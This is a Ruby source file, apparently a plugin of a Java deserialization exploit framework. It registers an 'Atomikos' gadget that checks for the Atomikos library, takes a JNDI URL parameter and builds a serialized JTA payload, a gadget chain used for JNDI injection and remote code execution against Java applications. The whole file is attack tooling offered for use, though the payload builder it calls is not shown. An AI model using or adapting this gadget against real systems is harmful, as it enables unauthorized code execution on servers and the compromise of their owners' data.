

require_relative '../payloads/atomikos'

class Atomikos < Java::Gadgets::Gadget
  def id
    'atomikos'
  end

  def usable(ctx, params: {})
    return false unless ctx.gadget?('atomikos')

    return false if params.fetch('jndiurl', nil).nil?

    true
  end

  def targets
    ['jndi']
  end

  def create(ctx, params: {})
    if ctx.flag?('atomikos4')
      ctx.reg.load('model/atomikos-4.json')
    else
      ctx.reg.load('model/atomikos-3.json')
    end

    if !params.fetch('jndiurl', nil).nil?
      Java::Serialize::Payloads::Atomikos.make_jta(params['jndiurl'])
    else
      raise 'Missing parameters'
    end
  end
end

Java::Gadgets.register(
  Atomikos.new
)
